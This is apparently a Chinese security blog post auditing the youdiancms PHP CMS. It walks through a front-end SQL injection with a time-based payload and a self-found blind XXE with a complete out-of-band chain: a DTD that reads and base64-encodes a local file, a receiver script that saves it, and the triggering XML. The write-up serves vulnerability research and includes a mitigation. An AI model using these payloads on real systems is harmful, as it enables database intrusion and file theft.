---
title: 某企业管理系统审计小结
tags:
 - 代码审计
 - php
date: 2019-10-06
---






# 1@ 前言

md 国庆睡的太爽了,睡爽了起来审一审 : p 

这次拿到的 youdiancms 是基于 tp 开发的一套简单的企业网站管理系统。cnvd 上收录关于其系统的漏洞只有星星点点的几个,故拿来复现练手,同时看看能不能再审出点自己的小洞~



# 2@ CNVD-2019-21447 前台 sql 注入

条件:

- 开启会员注册功能.
- 用已经注册过得会员登录.



由于基于 tp 开发,所以其路由规则就是类于 `/功能模块/类/方法/参数`  的 PATH_INFO 的模式.

在运行过程中,会动态生成一个主文件 ---> `yunxingshi.php`,由于写入的时候并没有考虑到排版问题,所以为了便于审计,我们可以在[这里](<http://tools.jb51.net/code/phpformat>)进行代码格式的美化.

这里我们省去路由传入参数的过程,着重来学习下在框架开发的模式下,从数据库中存取数据的流程.为了方便调试演示,直接给出存在问题的方法:

- App/Lib/Action/Member/CustomerAction/ 下的 saveModify 的方法

- 演示 url  :  `http://cms.test1/index.php/Member/Customer/saveModify`

  `POST : MemberName=root1&MemberID=1 and sleep(5);#`

```php
function saveModify(){
		header("Content-Type:text/html; charset=utf-8");
		$this->_checkPost( $_POST );
		unset( $_POST['InviterID'], $_POST['IsEnable']);
		$m = D('Admin/Member');
		$inviterID = $m->where("MemberID={$_POST['MemberID']}")->getField('InviterID');
......
```

可以看到,传入的 MemberID 参数,经过简单的处理,就直接带到了类的 where 方法里面进行查询了,如果包装类的方法再没有处理过程,那么很有可能产生注入,我们跟进观察.

1、首先跟进到 _checkPost() 方法中

```php
private function _checkPost($p){
		if( empty($p['MemberName']) ){
			$this->ajaxReturn(null, '昵称不能为空' , 0);
		}
		
		if( $_POST['MemberPassword'] != ''){
			$_POST['MemberPassword'] = md5($_POST['MemberPassword']);
		}else{
			unset( $_POST['MemberPassword'] );
		}
	}
```

没有进行传 入参数的过滤,只是提醒我们必须传入 MemberName 这个参数,否则返回错误提示信息.

2、接着 D() 方法大致流程就是新建一个模型类实例，然后返回

3、然后就到了关键的带入到实例中 where 方法中，我们来着重看看整个数据的流动过程：

- 没有 where 方法，首先调用到 __call() 这个魔术方法，来判断需要进行的操作。

```php
public function __call($method,$args) {
        if(in_array(strtolower($method),array('table','where','order','limit','page','alias','having','group','lock','distinct'),true)) {
            // 连贯操作的实现
            $this->options[strtolower($method)] =   $args[0];  // $method=where ; $args[0]= ‘MemberID=1 and sleep(3);#’
            return $this;
            ......
```

- 返回 this 接着上面的链式调用，访问 getField() 方法，其中有一个 _parseOptions() 的方法，跟进查看：

```php
  protected function _parseOptions($options=array()) {
        if(is_array($options))
            $options =  array_merge($this->options,$options);
        // 查询过后清空sql表达式组装 避免影响下次查询
        $this->options  =   array();
        if(!isset($options['table']))
            // 自动获取表名
            $options['table'] =$this->getTableName();
        if(!empty($options['alias'])) {
            $options['table']   .= ' '.$options['alias'];
        }
        // 记录操作的模型名称
        $options['model'] =  $this->name;
     
     ......
     
        // 表达式过滤
        $this->_options_filter($options);
        return $options;
    }
```



解析传入参数，为拼接查询语句做准备，注意里面有一个 _options_filter() 跟进查看：

```php
 protected function _options_filter(&$options) {}
```

md 竟然是个空函数哈哈，我猜这可能是开发者为了之后爆出漏洞好修补直接首先写好的一个占位函数，至于具体怎么修，还得等待白帽子们怎么破了，有意思。

- 返回到 getField() 方法中，查询的是一个字段，所以我们直接跳到 else 分支：

```php
else{   // 查找一条记录
          $options['limit'] = 1;
          $result = $this->db->select($options);
          if(!empty($result)) {
              return reset($result[0]);
          }
      }
```

跟进到模型实例的数据库资源中进行查询：

```php
// select 方法
public function select($options=array()) {
        $this->model  =   $options['model'];
        $sql   = $this->buildSelectSql($options);
        // 构造的 sql 语句为 select ‘InviterID’ FROM ‘youdian_member’ WHERE MemberID=2 and sleep(3);#limit1
        
        $cache  =  isset($options['cache'])?$options['cache']:false;
 ......
      
        $result   = $this->query($sql);
```



带入到数据库中进行查询，造成 sql 注入。



 ![1](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./1.png)





整个过程不难，我主要想要总结的是这套系统运作后台数据库的方法和设计模式：

由于用户使用的数据库扩展类型是未知的，所以代码需要根据不同情况选择不同的数据库连接:

- 所有数据库对象的基类 `App/Core/Lib/Core/Db.class.php`,此系统支持 mysql 和 mysqli 两个扩展，根据选择情况来构建数据库对象，继承父类的一些声明和方法即可直接进行使用。
- 工厂模式：工厂模式就是将创造对象的方法封装在一个文件的类函数里面，然后返回创建的对象，避免了 new 操作，而且当创建对象的方法或者参数改变的时候，我们可以直接修改工厂方法。

这里的父类 Db.class.php 使用了工厂模式产生数据库对象，即 **factory()** 方法：

```php
public function factory($db_config='') {
        // 读取数据库配置
        $db_config = $this->parseConfig($db_config);
        if(empty($db_config['dbms']))
            throw_exception(L('_NO_DB_CONFIG_'));
        // 数据库类型
        $this->dbType = ucwords(strtolower($db_config['dbms']));
        $class = 'Db'. $this->dbType;
        if(is_file(CORE_PATH.'Driver/Db/'.$class.'.class.php')) {
            // 内置驱动
            $path = CORE_PATH;
        }else{ // 扩展驱动
            $path = EXTEND_PATH;
        }
        // 检查驱动类
        if(require_cache($path.'Driver/Db/'.$class.'.class.php')) {
            $db = new $class($db_config);
            // 获取当前的数据库类型
            if( 'pdo' != strtolower($db_config['dbms']) )
                $db->dbType = strtoupper($this->dbType);
            else
                $db->dbType = $this->_getDsnType($db_config['dsn']);
            if(APP_DEBUG)  $db->debug    = true;
        }else {
            // 类没有定义
            throw_exception(L('_NOT_SUPPORT_DB_').': ' . $db_config['dbms']);
        }
        return $db;
    }
```



然后在构造函数 __construct() 中使用此方法创建数据库对象：

```php
public function __construct($config=''){
        return $this->factory($config);
    }
```



php 有很多设计模式我们可以了解和学习，[这里](https://www.imooc.com/learn/236)是慕课的一个不错的免费讲解设计模式的课程。



ps: 同样的分析方法还能发现一个前台 xss 漏洞。





# 3@ 前台 xxe  

以前一直觉得 xxe 这种漏洞很少会在实战中出现，这也算是自己第一次实战审出 xxe ,由于利用条件比较苛刻，没有上报到 cnvd 等平台，在此做下简单分析 (为了保护厂家隐私，此文章已经上密码，仅做笔记和供朋友参阅，望大家注意自身安全)。

文件位置：

```
/App/Lib/Common/YdWx.class.php
```



```php
// 关键方法
public function responseMsg(){
		//$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];	//get post data, May be due to the different environments
        $postStr = file_get_contents("php://input");
		if (empty($postStr) ) return;
		$HasCustomerService = $GLOBALS['Config']['WX_CUSTOMER_SERVICE']; //是否启用多客服
		//用户发送消息－> 公众帐号
		$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);
		......
```



可以看到，此方法将 post 流中的数据直接放入到 `simplexml_load_string()` 函数中，由于此方法未传入其他参数，所以只要有使用此方法的地方，必然会有 xxe 漏洞。

由于本机未装 php 5.6 以下版本，所以本次测试环境为 :

```
os : win10
php_version : 5.4.45   
```

网上很多文章都有写 libxml 2.9.1 以上的 php 默认会禁止加载外部实体，实际上 libxml 2.9.4 这一版的 php 依旧可以成功加载外部实体。因为 php 7.0 以上的版本集成的 libxml 还是有 2.9.4 版，所以此漏洞也是可以在 php7 上复现的，这个问题由 Cart0a 提出。具体禁用加载外部实体的 libxml 版本有待探索。


由于是无回显形式的 xxe，所以我们需要构造一个数据接收方：

- 我们先在本地上传模拟测试实体 `test.dtd`

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/receive.php?p=%file;'>">
```

- 然后构造接收脚本 `receive.php`

```php
<?php
file_put_contents("result.txt",$_GET['p']);
?>
```

- 最后将 payload 传入到 post 流中，偷取到的数据写入到 `result.txt` 文件中

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://127.0.0.1/test.dtd">
%remote;%int;%send;
]>
```



 ![2](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./2.png)



【由于图片需要上传需要打码，复现可根据上文文字步骤进行】



 ![3](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./3.png)



成功偷到数据。



暂时的防御办法就是：

```php
libxml_disable_entity_loader(true);
```





# 4@ 其他

此系统还存在前后台的 csrf 漏洞，xss漏洞，有兴趣可自行审计。









Refererece：

`https://www.cnvd.org.cn/flaw/show/CNVD-2019-21447`

